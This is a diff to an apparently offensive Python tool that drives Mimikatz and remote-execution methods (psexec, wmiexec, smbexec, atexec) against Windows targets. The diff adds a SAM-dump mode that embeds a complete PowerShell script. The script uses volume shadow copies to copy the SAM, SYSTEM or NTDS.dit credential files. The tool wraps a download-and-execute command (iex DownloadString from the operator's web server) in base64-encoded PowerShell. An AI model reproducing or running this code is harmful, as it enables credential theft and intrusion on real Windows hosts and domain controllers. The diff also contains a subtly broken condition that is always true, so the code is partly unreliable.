@@ -68,12 +68,129 @@ class Obfiscator:
         elif "psexec" in self.execution:
             # Direct invoker via psexec
             self.invoker_psexec()
+        elif "sam_dump" in self.execution:
+            # Dump the SAM table
+            self.sam_dump()
 
     def packager(self, cleartext):
         encoded_utf = cleartext.encode('utf-16-le')
         encoded_base64 = base64.b64encode(encoded_utf)
         command = "powershell.exe -nop -enc %s" % (encoded_base64)
         return(command)
+
+    def sam_dump(self):
+        function = "Get-PasswordFile"
+        #The Get-PasswordFile PowerShell function is not covered under the BSD 3-Clause license
+        # Credit for this script goes to ObscureSecurity
+        script = '''function Get-PasswordFile {
+<#
+.SYNOPSIS
+    Copies either the SAM or NTDS.dit and system files to a specified directory.
+    Author: Chris Campbell (@obscuresec)
+    License: BSD 3-Clause
+.PARAMETER DestinationPath
+    Specifies the directory to the location where the password files are to be copied.
+.OUTPUTS
+    None or an object representing the copied items.
+.EXAMPLE
+    Get-PasswordFile "c:\\temp"
+#>
+    [CmdletBinding()]
+    Param
+    (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [ValidateScript({Test-Path $_ -PathType 'Container'})]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $DestinationPath
+    )
+        #Define Copy-RawItem helper function from http://gallery.technet.microsoft.com/scriptcenter/Copy-RawItem-Private-NET-78917643
+        function Copy-RawItem
+        {
+        [CmdletBinding()]
+        [OutputType([System.IO.FileSystemInfo])]
+        Param (
+            [Parameter(Mandatory = $True, Position = 0)]
+            [ValidateNotNullOrEmpty()]
+            [String]
+            $Path,
+            [Parameter(Mandatory = $True, Position = 1)]
+            [ValidateNotNullOrEmpty()]
+            [String]
+            $Destination,
+            [Switch]
+            $FailIfExists
+        )
+        # Get a reference to the internal method - Microsoft.Win32.Win32Native.CopyFile()
+        $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')}
+        $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native')
+        $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static'))
+        # Perform the copy
+        $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists'])))
+        $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        if ($CopyResult -eq $False -and $HResult -ne 0)
+        {
+            # An error occured. Display the Win32 error set by CopyFile
+            throw ( New-Object ComponentModel.Win32Exception )
+        }
+        else
+        {
+            Write-Output (Get-ChildItem $Destination)
+        }
+    }
+    #Check for admin rights
+    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+    {
+        Write-Error "Not running as admin. Run the script with elevated credentials"
+        Return
+    }
+    #Get "vss" service startup type
+    $VssStartMode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode
+    if ($VssStartMode -eq "Disabled") {Set-Service vss -StartUpType Manual}
+    #Get "vss" Service status and start it if not running
+    $VssStatus = (Get-Service vss).status
+    if ($VssStatus -ne "Running") {Start-Service vss}
+        #Check to see if we are on a DC
+        $DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole
+        $IsDC = $False
+        if ($DomainRole -gt 3) {
+            $IsDC = $True
+            $NTDSLocation = (Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters)."DSA Database File"
+            $FileDrive = ($NTDSLocation).Substring(0,3)
+        } else {$FileDrive = $Env:HOMEDRIVE + '\\'}
+        #Create a volume shadow filedrive
+        $WmiClass = [WMICLASS]"root\\cimv2:Win32_ShadowCopy"
+        $ShadowCopy = $WmiClass.create($FileDrive, "ClientAccessible")
+        $ReturnValue = $ShadowCopy.ReturnValue
+        if ($ReturnValue -ne 0) {
+            Write-Error "Shadow copy failed with a value of $ReturnValue"
+            Return
+        }
+        #Get the DeviceObject Address
+        $ShadowID = $ShadowCopy.ShadowID
+        $ShadowVolume = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $ShadowID}).DeviceObject
+            #If not a DC, copy System and SAM to specified directory
+            if ($IsDC -ne $true) {
+                $SamPath = Join-Path $ShadowVolume "\\Windows\\System32\\Config\\sam"
+                $SystemPath = Join-Path $ShadowVolume "\\Windows\\System32\\Config\\system"
+                #Utilizes Copy-RawItem from Matt Graeber
+                Copy-RawItem $SamPath "$DestinationPath\\sam"
+                Copy-RawItem $SystemPath "$DestinationPath\\system"
+            } else {
+                #Else copy the NTDS.dit and system files to the specified directory
+                $NTDSPath = Join-Path $ShadowVolume "\\Windows\\NTDS\NTDS.dit"
+                $SystemPath = Join-Path $ShadowVolume "\\Windows\\System32\\Config\\system"
+                Copy-RawItem $NTDSPath "$DestinationPath\\ntds"
+                Copy-RawItem $SystemPath "$DestinationPath\\system"
+            }
+        #Return "vss" service to previous state
+        If ($VssStatus -eq "Stopped") {Stop-Service vss}
+        If ($VssStartMode -eq "Disabled") {Set-Service vss -StartupType Disabled}
+}'''
+        with open(self.payload, "w") as f:
+            f.write(script)
+        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (self.src_ip, self.src_port, self.payload, function)
+        self.command = self.packager(text)
 
     def invoker(self):
         # Invoke Mimikatz Directly
@@ -152,12 +269,13 @@ def main():
     parser.add_argument("-s", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
     parser.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
     parser.add_argument("-r", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
-    parser.add_argument("-x", action="store", dest="payload", default=None, help="The name of the Mimikatz file")
+    parser.add_argument("-x", action="store", dest="payload", default="/root/x.ps1", help="The name of the Mimikatz file")
     parser.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
     parser.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
-    parser.add_argument("-i", "--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
-    parser.add_argument("-l", "--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
-    parser.add_argument("-c", "--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
+    parser.add_argument("--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
+    parser.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
+    parser.add_argument("--sam_dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
+    parser.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
     parser.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
     parser.add_argument("-d", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
     parser.add_argument("-u", action="store", dest="usr", default="Administrator", help="The username that will be used to exploit the system, defaults to administrator")
@@ -166,6 +284,7 @@ def main():
     parser.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
     parser.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
     parser.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the invoker process into the system memory with at")
+    parser.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
@@ -195,10 +314,15 @@ def main():
     dom = args.dom
     target = args.target
     command = args.command
+    filename = args.filename
+    sam_dump = args.sam_dump
     execution = ""
     supplement = ""
     hash = None
     methods = False
+
+    if filename:
+        payload = filename
 
     if smbexec_cmd or wmiexec_cmd or psexec_cmd or atexec_cmd:
         methods = True
@@ -266,8 +390,13 @@ def main():
         execution = "invoker"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
         command = x.return_command()
+    elif sam_dump:
+        execution = "sam_dump"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
+        command = x.return_command()
 
-    if "invoker" in execution:
+
+    if "invoker" or "sam_dump" in execution:
         supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
 [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
     elif "downloader" in execution:
